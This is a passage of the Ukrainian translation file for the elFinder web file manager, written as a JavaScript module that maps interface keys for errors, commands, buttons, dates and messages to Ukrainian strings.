/**
 * Українська мова translation
 * @author ITLancer
 * @author cjayho <cj.fooser@gmail.com>
 * @version 2022-03-03
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.uk = {
		translator : 'ITLancer, cjayho &lt;cj.fooser@gmail.com&gt;',
		language   : 'Українська мова',
		direction  : 'ltr',
		dateFormat : 'd.m.Y H:i', // will show like: 03.03.2022 18:02
		fancyDateFormat : '$1 H:i', // will show like: сьогодні 18:02
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220303-180221
		messages   : {
			'getShareText' : 'Поділіться',
			'Editor ': 'Редактор коду',

			/********************************** errors **********************************/
			'error'                : 'Помилка',
			'errUnknown'           : 'Невідома помилка.',
			'errUnknownCmd'        : 'Невідома команда.',
			'errJqui'              : 'Неправильне налаштування jQuery UI. Відсутні компоненти: selectable, draggable, droppable.',
			'errNode'              : 'Відсутній елемент DOM для створення elFinder.',
			'errURL'               : 'Неправильне налаштування! Не вказана опція URL.',
			'errAccess'            : 'Доступ заборонено.',
			'errConnect'           : 'Не вдалося з’єднатися з backend.',
			'errAbort'             : 'З’єднання розірване.',
			'errTimeout'           : 'Тайм-аут з’єднання.',
			'errNotFound'          : 'Не знайдено backend.',
			'errResponse'          : 'Неправильна відповідь від backend.',
			'errConf'              : 'Неправильне налаштування backend.',
			'errJSON'              : 'Модуль PHP JSON не встановлено.',
			'errNoVolumes'         : 'Немає доступних для читання директорій.',
			'errCmdParams'         : 'Неправильні параметри для команди "$1".',
			'errDataNotJSON'       : 'Дані не у форматі JSON.',
			'errDataEmpty'         : 'Дані відсутні.',
			'errCmdReq'            : 'Backend вимагає назву команди.',
			'errOpen'              : 'Неможливо відкрити "$1".',
			'errNotFolder'         : 'Об’єкт не є папкою.',
			'errNotFile'           : 'Об’єкт не є файлом.',
			'errRead'              : 'Неможливо прочитати "$1".',
			'errWrite'             : 'Неможливо записати в "$1".',
			'errPerm'              : 'Помилка доступу.',
			'errLocked'            : 'Файл "$1" заблоковано і його неможливо перемістити, перейменувати чи вилучити.',
			'errExists'            : 'Файл з назвою "$1" вже існує.',
			'errInvName'           : 'Недійсна назва файла.',
			'errInvDirname'        : 'Недійсна назва теки.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Теку не знайдено.',
			'errFileNotFound'      : 'Файл не знайдено.',
			'errTrgFolderNotFound' : 'Цільову теку "$1" не знайдено.',
			'errPopup'             : 'Браузер забороняє відкривати popup-вікно. Дозвольте у налаштування браузера, щоб відкрити файл.',
			'errMkdir'             : 'Неможливо створити теку "$1".',
			'errMkfile'            : 'Неможливо створити файл "$1".',
			'errRename'            : 'Неможливо перейменувати файл "$1".',
			'errCopyFrom'          : 'Копіювання файлів з тому "$1" не дозволено.',
			'errCopyTo'            : 'Копіювання файлів на том "$1" не дозволено.',
			'errMkOutLink'         : 'Неможливо створити посилання у місце за межами кореневої теки носія.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Помилка відвантаження.',  // old name - errUploadCommon
			'errUploadFile'        : 'Неможливо відвантажити файл "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Не знайдено файлів для відвантаження.',
			'errUploadTotalSize'   : 'Об\'єм даних перевищив встановлений ліміт.', // old name - errMaxSize
			'errUploadFileSize'    : 'Об\'єм файла перевищив встановлений ліміт.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Файли цього типу заборонені.',
			'errUploadTransfer'    : '"$1" : помилка передачі.',
			'errUploadTemp'        : 'Неможливо створити тимчасовий файл для відвантаження.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Об\'єкт "$1" вже існує тут та не може бути заміненим на об\'єкт іншого типу.', // new
			'errReplace'           : 'Неможливо замінити "$1".',
			'errSave'              : 'Неможливо записати "$1".',
			'errCopy'              : 'Неможливо скопіювати "$1".',
			'errMove'              : 'Неможливо перенести "$1".',
			'errCopyInItself'      : 'Неможливо скопіювати "$1" сам у себе.',
			'errRm'                : 'Неможливо вилучити "$1".',
			'errTrash'             : 'Неможливо пересунути до смітника.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Неможливо видалити оригінальний(і) файл(и).',
			'errExtract'           : 'Неможливо розпакувати файли з "$1".',
			'errArchive'           : 'Неможливо створити архів.',
			'errArcType'           : 'Тип архіву не підтримується.',
			'errNoArchive'         : 'Файл не є архівом, або є архівом, тип якого не підтримується.',
			'errCmdNoSupport'      : 'Серверна частина не підтримує цієї команди.',
			'errReplByChild'       : 'Папка “$1” не може бути замінена елементом, який вона містить.',
			'errArcSymlinks'       : 'З міркувань безпеки заборонено розпаковувати архіви з символічними посиланнями.', // edited 24.06.2012
			'errArcMaxSize'        : 'Розмір файлів архіву перевищує допустиме значення.',
			'errResize'            : 'Неможливо масштабувати "$1".',
			'errResizeDegree'      : 'Недійсний кут обертання.',  // added 7.3.2013
			'errResizeRotate'      : 'Неможливо повернути світлину.',  // added 7.3.2013
			'errResizeSize'        : 'Недійсний розмір світлини.',  // added 7.3.2013
			'errResizeNoChange'    : 'Розмір світлини не змінено.',  // added 7.3.2013
			'errUsupportType'      : 'Непідтримуваний тип файла.',
			'errNotUTF8Content'    : 'Файл "$1" не в UTF-8 і не може бути відредагований.',  // added 9.11.2011
			'errNetMount'          : 'Неможливо змонтувати "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Непідтримуваний протокл.',     // added 17.04.2012
			'errNetMountFailed'    : 'В процесі монтування сталася помилка.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Необхідно вказати хост.', // added 18.04.2012
			'errSessionExpires'    : 'Час сеансу минув через неактивність.',
			'errCreatingTempDir'   : 'НЕможливо створити тимчасову директорію: "$1"',
			'errFtpDownloadFile'   : 'Неможливо завантажити файл з FTP: "$1"',
			'errFtpUploadFile'     : 'Неможливо завантажити файл на FTP: "$1"',
			'errFtpMkdir'          : 'Неможливо створити віддалений каталог на FTP: "$1"',
			'errArchiveExec'       : 'Помилка при архівації файлів: "$1"',
			'errExtractExec'       : 'Помилка при розархівуванні файлів: "$1"',
			'errNetUnMount'        : 'Неможливо демонтувати', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Неможливо конвертувати в UTF - 8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Використовуйте Google Chrome, якщо ви хочете завантажити папку', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Час пошуку "$1" вийшов. Результат пошуку частковий', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Необхідна повторна авторизація.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Максимальна кількість об\'єктів що можна обрати складає $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Неможливо відновити зі смітника: неможливо визначити місце куди відновлювати.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Для цього типу файлів не знайдено редактора.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Помилка на боці сервера.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Неможливо спорожнити теку "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Є також ще $1 помилок.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Ви можете створити до $1 папки одночасно.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Архівувати',
			'cmdback'      : 'Назад',
			'cmdcopy'      : 'Копівати',
			'cmdcut'       : 'Вирізати',
			'cmddownload'  : 'Завантажити',
			'cmdduplicate' : 'Дублювати',
			'cmdedit'      : 'Редагувати файл',
			'cmdextract'   : 'Розпакувати файли з архіву',
			'cmdforward'   : 'Вперед',
			'cmdgetfile'   : 'Вибрати файли',
			'cmdhelp'      : 'Про програму',
			'cmdhome'      : 'Додому',
			'cmdinfo'      : 'Інформація',
			'cmdmkdir'     : 'Створити теку',
			'cmdmkdirin'   : 'До нової теки', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Створити файл',
			'cmdopen'      : 'Відкрити',
			'cmdpaste'     : 'Вставити',
			'cmdquicklook' : 'Попередній перегляд',
			'cmdreload'    : 'Перечитати',
			'cmdrename'    : 'Перейменувати',
			'cmdrm'        : 'Вилучити',
			'cmdtrash'     : 'До смітника', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Відновити', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Шукати файли',
			'cmdup'        : 'На 1 рівень вгору',
			'cmdupload'    : 'Відвантажити файли',
			'cmdview'      : 'Перегляд',
			'cmdresize'    : 'Масштабувати зображення',
			'cmdsort'      : 'Сортування',
			'cmdnetmount'  : 'Змонтувати мережевий диск', // added 18.04.2012
			'cmdnetunmount': 'Розмонтувати', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'До Місць', // added 28.12.2014
			'cmdchmod'     : 'Змінити права', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Відкрии директорію', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Скинути ширину стовпчика', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Повний екран', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Пересунути', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Спорожнити теку', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Скасувати', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Відновити', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Налаштування', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Вибрати усі', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Зняти вибір', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Інвертувати вибір', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Відкрити у новому вікні', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Сховати (Налаштування)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Закрити',
			'btnSave'   : 'Зберегти',
			'btnRm'     : 'Вилучити',
			'btnApply'  : 'Застосувати',
			'btnCancel' : 'Скасувати',
			'btnNo'     : 'Ні',
			'btnYes'    : 'Так',
			'btnMount'  : 'Підключити',  // added 18.04.2012
			'btnApprove': 'Перейти в $1 і прийняти', // from v2.1 added 26.04.2012
			'btnUnmount': 'Відключити', // from v2.1 added 30.04.2012
			'btnConv'   : 'Конвертувати', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Тут',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Розділ',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Всі',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME тип', // from v2.1 added 22.5.2015
			'btnFileName':'Назва файла',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Зберегти і вийти', // from v2.1 added 12.6.2015
			'btnBackup' : 'Резервна копія', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Перейменувати',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Перейменуваті(Усі)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Попер. ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Наступ. ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Зберегти як', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Відкрити теку',
			'ntffile'     : 'Відкрити файл',
			'ntfreload'   : 'Перечитати вміст теки',
			'ntfmkdir'    : 'Створення теки',
			'ntfmkfile'   : 'Створення файлів',
			'ntfrm'       : 'Вилучити файли',
			'ntfcopy'     : 'Копіювати файли',
			'ntfmove'     : 'Перенести файли',
			'ntfprepare'  : 'Підготовка до копіювання файлів',
			'ntfrename'   : 'Перейменувати файли',
			'ntfupload'   : 'Відвантажити файли',
			'ntfdownload' : 'Завантажити файли',
			'ntfsave'     : 'Записати файли',
			'ntfarchive'  : 'Створення архіву',
			'ntfextract'  : 'Розпаковування архіву',
			'ntfsearch'   : 'Пошук файлів',
			'ntfresize'   : 'Зміна розміру світлини',
			'ntfsmth'     : 'Виконуємо',
			'ntfloadimg'  : 'Завантаження зображення',
			'ntfnetmount' : 'Монтування мережевого диска', // added 18.04.2012
			'ntfnetunmount': 'Розмонтування мережевого диска', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Визначення розміру світлини', // added 20.05.2013
			'ntfreaddir'  : 'Читання інформації директорії', // from v2.1 added 01.07.2013
			'ntfurl'      : 'отримання URL посилання', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Зміна прав файлу', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Перевірка імені завантажуваного файла', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Створення файлу для завантаження', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Отримання інформації про шлях', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Обробка вивантаженого файлу', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Переміщуємо до смітника', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Відновлюємо зі смітника', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Перевіряємо теку призначення', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Скасування попередньої дії', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Повторення раніше скасованої дії', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Перевірка вмісту', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Смітник', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'невідомо',
			'Today'       : 'сьогодні',
			'Yesterday'   : 'вчора',
			'msJan'       : 'Січ',
			'msFeb'       : 'Лют',
			'msMar'       : 'Бер',
			'msApr'       : 'Кві',
			'msMay'       : 'Тра',
			'msJun'       : 'Чер',
			'msJul'       : 'Лип',
			'msAug'       : 'Сер',
			'msSep'       : 'Вер',
			'msOct'       : 'Жов',
			'msNov'       : 'Лис',
			'msDec'       : 'Гру',
			'January'     : 'січня',
			'February'    : 'лютого',
			'March'       : 'березня',
			'April'       : 'квітня',
			'May'         : 'травня',
			'June'        : 'червня',
			'July'        : 'липня',
			'August'      : 'серпня',
			'September'   : 'вересня',
			'October'     : 'жовтня',
			'November'    : 'листопада',
			'December'    : 'грудня',
			'Sunday'      : 'Неділя',
			'Monday'      : 'Понеділок',
			'Tuesday'     : 'Вівторок',
			'Wednesday'   : 'Середа',
			'Thursday'    : 'Четвер',
			'Friday'      : 'П’ятниця',
			'Saturday'    : 'Субота',
			'Sun'         : 'Нд',
			'Mon'         : 'Пн',
			'Tue'         : 'Вт',
			'Wed'         : 'Ср',
			'Thu'         : 'Чт',
			'Fri'         : 'Пт',
			'Sat'         : 'Сб',

			/******************************** sort variants ********************************/
			'sortname'          : 'за назвою',
			'sortkind'          : 'за типом',
			'sortsize'          : 'за розміром',
			'sortdate'          : 'за датою',
			'sortFoldersFirst'  : 'Список тек',
			'sortperm'          : 'за дозволами', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'за режимом',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'за власником',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'за групою',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Також вигляд дерева',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'неназваний файл.txt', // added 10.11.2015
			'untitled folder'   : 'неназвана тека',   // added 10.11.2015
			'Archive'           : 'НовийАрхів',  // from v2.1 added 10.11.2015
			'untitled file'     : 'НовийФайл.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Файл',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2 ',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Необхідне підтвердження',
			'confirmRm'       : 'Ви справді хочете вилучити файли?<br/>Операція незворотня!',
			'confirmRepl'     : 'Замінити старий файл новим? (при наявності тек вони будуть об\'єднані. Для резервної копії та заміни оберіть Резервну Копію)',
			'confirmRest'     : 'Замінити існуючий об\'єкт об\'єктом зі смітника?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Не у UTF-8<br/>Конвертувати у UTF-8?<br/>Вміст стане у UTF-8 збереженням після конвертації.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Кодування символів цього файлу неможливо визначити. Потрібно тимчасово конвертувати його у UTF-8 для редагування.<br/>Оберіть кодування цього файлу.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Було внесено зміни.<br/>Якщо ії не зберегти, їх буде втрачено.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Ви точно бажаєте перемістити ці об\'єкти до смітника?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Ви точно бажаєте перемістити об\'єкти до "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Застосувати до всіх',
			'name'            : 'Назва',
			'size'            : 'Розмір',
			'perms'           : 'Доступи',
			'modify'          : 'Змінено',
			'kind'            : 'Тип',
			'read'            : 'читання',
			'write'           : 'запис',
			'noaccess'        : 'недоступно',
			'and'             : 'і',
			'unknown'         : 'невідомо',
			'selectall'       : 'Вибрати всі файли',
			'selectfiles'     : 'Вибрати файл(и)',
			'selectffile'     : 'Вибрати перший файл',
			'selectlfile'     : 'Вибрати останній файл',
			'viewlist'        : 'Списком',
			'viewicons'       : 'Значками',
			'viewSmall'       : 'Маленькі значки', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Середні значки', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Великі значки', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Дуже великі значки', // from v2.1.39 added 22.5.2018
			'places'          : 'Розташування',
			'calc'            : 'Вирахувати',
			'path'            : 'Шлях',
			'aliasfor'        : 'Аліас для',
			'locked'          : 'Заблоковано',
			'dim'             : 'Розміри',
			'files'           : 'Файли',
			'folders'         : 'теки',
			'items'           : 'Елементи',
			'yes'             : 'так',
			'no'              : 'ні',
			'link'            : 'Посилання',
			'searcresult'     : 'Результати пошуку',
			'selected'        : 'Вибрані елементи',
			'about'           : 'Про',
			'shortcuts'       : 'Ярлики',
			'help'            : 'Допомога',
			'webfm'           : 'Web-менеджер файлів',
			'ver'             : 'Версія',
			'protocolver'     : 'версія протоколу',
			'homepage'        : 'Сторінка проекту',
			'docs'            : 'Документація',
			'github'          : 'Fork us on Github',
			'twitter'         : 'Слідкуйте у Твітері',
			'facebook'        : 'Приєднуйтесь у фейсбуці',
			'team'            : 'Автори',
			'chiefdev'        : 'головний розробник',
			'developer'       : 'розробник',
			'contributor'     : 'учасник',
			'maintainer'      : 'супроводжувач',
			'translator'      : 'перекладач',
			'icons'           : 'Значки',
			'dontforget'      : 'і не забудьте рушничок',
			'shortcutsof'     : 'Створення посилань вимкнено',
			'dropFiles'       : 'Кидайте файли сюди',
			'or'              : 'або',
			'selectForUpload' : 'Виберіть файли для відвантаження',
			'moveFiles'       : 'Перемістити файли',
			'copyFiles'       : 'Копіювати файли',
			'restoreFiles'    : 'Відновити об\'єкти', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Вилучити з розташувань',
			'aspectRatio'     : 'Співвідношення',
			'scale'           : 'Масштаб',
			'width'           : 'Ширина',
			'height'          : 'Висота',
			'resize'          : 'Змінити розмір',
			'crop'            : 'Обрізати',
			'rotate'          : 'Повернути',
			'rotate-cw'       : 'Повернути на 90 градусів за год. стр.',
			'rotate-ccw'      : 'Повернути на 90 градусів проти год. стр.',
			'degree'          : 'Градус',
			'netMountDialogTitle' : 'Змонтувати носій у мережі', // added 18.04.2012
			'protocol'            : 'версія протоколу', // added 18.04.2012
			'host'                : 'Хост', // added 18.04.2012
			'port'                : 'Порт', // added 18.04.2012
			'user'                : 'Логін', // added 18.04.2012
			'pass'                : 'Пароль', // added 18.04.2012
			'confirmUnmount'      : 'Ви відмонтовуєте $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Перетягніть або вставте файли з оглядача', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Перетягніть файли, Вставте URL або світлини (з буфера обміну) сюди', // from v2.1 added 07.04.2014
			'encoding'        : 'Кодування', // from v2.1 added 19.12.2014
			'locale'          : 'Локаль',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Призначення: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Пошук за введеним типом MIME', // from v2.1 added 22.5.2015
			'owner'           : 'Власник', // from v2.1 added 20.6.2015
			'group'           : 'Група', // from v2.1 added 20.6.2015
			'other'           : 'Інші', // from v2.1 added 20.6.2015
			'execute'         : 'Виконання', // from v2.1 added 20.6.2015
			'perm'            : 'Дозвіл', // from v2.1 added 20.6.2015
			'mode'            : 'Режим', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Тека порожня', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Тека порожня\\A Перетягніть об\'єкти для додавання', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Тека порожня\\A Для додавання об\'єктів торкніть та утримуйте', // from v2.1.6 added 30.12.2015
			'quality'         : 'Якість', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Авто синх.',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Пересунути вгору',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Отримати URL', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Обрані об\'єкти ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID теки', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Дозволити доступ офлайн', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Для реаутентифікації', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Зараз завантажуємо...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Відкрити декілька файлів', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Ви намагаєтесь відкрити $1 файлів. Ви впевнені що хочете відкрити ії у оглядачі?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Пошук не дав результатів у обраному місці.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Редагує файл.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Ви обрали $1 об\'єктів.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'У вас є $1 об\'єктів у буфері обміну.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Інкрементний пошук є тільки для поточного перегляду.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Відновити', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 виконано', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Контекстне меню', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Обертання сторінки', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Кореневі теки носіїв', // from v2.1.16 added 16.9.2016
			'reset'           : 'Обнулити', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Колір фону', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Обрати колір', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'сітка 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Увімкнено', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Вимкнено', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Результати пошуку у поточному перегляді відсутні.\\AНатисніть [Enter] для розширення критеріїв пошуку.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Результати пошуку за першою літерою відсутні у поточному перегляді.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Текстова мітка', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 хв. залишилось', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Відкрити знову з обраним кодуванням', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Зберегти з обраним кодуванням', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Обрати теку', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Пошук за першою літерою', // from v2.1.23 added 24.3.2017
			'presets'         : 'Шаблони', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Дуже багато об\'єктів для переміщення у смітник.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'ТекстовеПоле', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Спорожнити теку "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Тека "$1" порожня.', // from v2.1.25 added 22.6.2017
			'preference'      : 'Налаштування', // from v2.1.26 added 28.6.2017
			'language'        : 'Мова', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Ініціювати налаштування збережені у цьому оглядачі', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Налаштування лотку інструментів', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 символів залишилось.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... $1 рядків залишилось.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Сума', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Приблизний розмір файу', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Фокусувати елемент діалога при наведенні курсора миші',  // from v2.1.30 added 2.11.2017
			'select'          : 'Обрати', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Дія при виборі файла', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Відкрити редактором, що використовувався крайній раз.', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Інвертувати вибір', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Ви точно хочете перейменувати $1 обраних об\'єктів на кшталт $2?<br/>Це незворотна дія!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Пакетне перейменування', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Число', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Додати префікс', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Додати суфікс', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Змінити розширення', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Налаштування стовпчиків (вигляд списку)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Усі зміни будуть негайно застосовані у архіві.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Деякі зміни не буде видно до розмонтування носія.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Наступний(і) носій(ї) на цьому носії також не змонтовані. Ви точно хочете відмонтувати носій?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Інформація про обране', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Алгоритми для показу хешу файла', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Інформаційні об\'єкти (Панель інформації про обране)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Натисніть знову для виходу.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Панель інструментів', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Робочий простір', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Діалог', // from v2.1.38 added 4.4.2018
			'all'             : 'Усі', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Розмір значків (вигляд значків)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Відкрити розгорнуте вікно редактора', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Через неможливість конвертування API, сконвертуйте на вебсайті.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Після конвертування вам треба завантажити за допомогою URL або збереженого файу, для збереження конвертованого файлу.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Конвертувати сайт з $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Інтеграції', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Цей elFinder має наступні інтегровані сервіси. Перевірте умови використання, політику приватності та інше перед використанням.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Показати приховані об\'єкти', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Сховати приховані об\'єкти', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Показати/Сховати приховані о\'єкти', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Типи файлів, які можна створювати', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Тип текстового файлу', // from v2.1.41 added 7.8.2018
			'add'             : 'Додати', // from v2.1.41 added 7.8.2018
			'theme'           : 'Тема', // from v2.1.43 added 19.10.2018
			'default'         : 'Як зазвичай', // from v2.1.43 added 19.10.2018
			'description'     : 'Опис', // from v2.1.43 added 19.10.2018
			'website'         : 'Веб-сайт', // from v2.1.43 added 19.10.2018
			'author'          : 'Автор', // from v2.1.43 added 19.10.2018
			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Ліцензія', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Об\'єкт неможливо зберегти. Щоб уникнути втрати правок вам треба експортувати ії до себе у пристрій.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Двічі клацніть файл для вибору.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Використовувати повноекранний режим', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Невідомо',
			'kindRoot'        : 'Коренева тека носія', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Папка',
